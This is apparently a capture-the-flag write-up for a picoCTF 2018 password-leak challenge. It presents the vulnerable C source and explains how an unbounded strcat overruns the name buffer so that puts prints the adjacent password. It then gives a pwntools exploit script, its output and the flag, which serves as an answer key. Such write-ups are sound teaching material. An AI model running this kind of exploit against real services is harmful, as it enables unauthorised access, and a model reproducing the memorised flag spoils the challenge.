# buffer overflow 1
Binary Exploitation, 200 points

## Description:
> Can you authenticate to this service and get the flag? Connect with nc 2018shell3.picoctf.com 57659. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}


int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  // real pw: 
  FILE *file;
  char password[64];
  char name[256];
  char password_input[64];
  
  memset(password, 0, sizeof(password));
  memset(name, 0, sizeof(name));
  memset(password_input, 0, sizeof(password_input));
  
  printf("What is your name?\n");
  
  fgets(name, sizeof(name), stdin);
  char *end = strchr(name, '\n');
  if (end != NULL) {
    *end = '\x00';
  }

  strcat(name, ",\nPlease Enter the Password.");

  file = fopen("password.txt", "r");
  if (file == NULL) {
    printf("Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(password, sizeof(password), file);

  printf("Hello ");
  puts(name);

  fgets(password_input, sizeof(password_input), stdin);
  password_input[sizeof(password_input)] = '\x00';
  
  if (!strcmp(password_input, password)) {
    flag();
  }
  else {
    printf("Incorrect Password!\n");
  }
  return 0;
}


```

## Solution:

This program reads a name from the user into a buffer of 256 bytes, followed by a password read from a file into another local buffer. It then reads a password from the user, and if the user password matches the correct password - outputs the flag.

According to the name of the challenge, we need to leak the correct password.

Let's inspect the code part after part.

The first part reads the name from the user and appends a NULL terminator, if needed:
```c
  fgets(name, sizeof(name), stdin);
  char *end = strchr(name, '\n');
  if (end != NULL) {
    *end = '\x00';
  }
```

The buffer size is 256 bytes, and `fgets` indeed reads here up to 256 bytes (`sizeof(name)`). No problem here.

What comes immediately later seems a bit more problematic:
```c
strcat(name, ",\nPlease Enter the Password.");
```

A string is appended to the name, without checking the buffer bounds. Therefore, if we supply a name of length 255, the `strcat` will append a 27-byte-long string to it, creating a consecutive buffer of 255+27 characters followed by a NULL terminator. Since `name` only has room for 256 characters, part of the string will be in fact stored in the `password` buffer.

Why is this important? Since a few lines later, the `password` buffer is populated with the real password, followed by a call to `puts` to print the name:
```c
  fgets(password, sizeof(password), file);

  printf("Hello ");
  puts(name);
```

Since no NULL terminator is separating between the name and the password (the `strcat` operation moved it from the `name` buffer to the `password` buffer), printing the name will in fact continue and print out the password as well, as one consecutive string.

Therefore, in order to leak the flag, we just need to enter a 255-byte name:

```python
from pwn import *

NAME_BUFFER_LENGTH = 256

def login(name, password):
    r = remote("2018shell3.picoctf.com", 57659)
    r.sendlineafter("What is your name?", name)
    out = r.recv(timeout = 5)
    r.sendline(password)
    return r.recvall()


leak = login("A" * NAME_BUFFER_LENGTH, "Fake Password")
password = leak.split(",")[1].replace("Incorrect Password!", "").rstrip()
log.info("Password: {}".format(password))

print login("Fake Name", password)
```

Output:
```console
root@kali:/media/sf_CTFs/pico/leak-me# python exploit.py
[+] Opening connection to 2018shell3.picoctf.com on port 57659: Done
[+] Receiving all data: Done (315B)
[*] Closed connection to 2018shell3.picoctf.com port 57659
[*] Password: a_reAllY_s3cuRe_p4s$word_56b977
[+] Opening connection to 2018shell3.picoctf.com on port 57659: Done
[+] Receiving all data: Done (91B)
[*] Closed connection to 2018shell3.picoctf.com port 57659
Hello Fake Name,
Please Enter the Password.
picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_2b5cbbaa}
```

The flag: picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_2b5cbbaa}

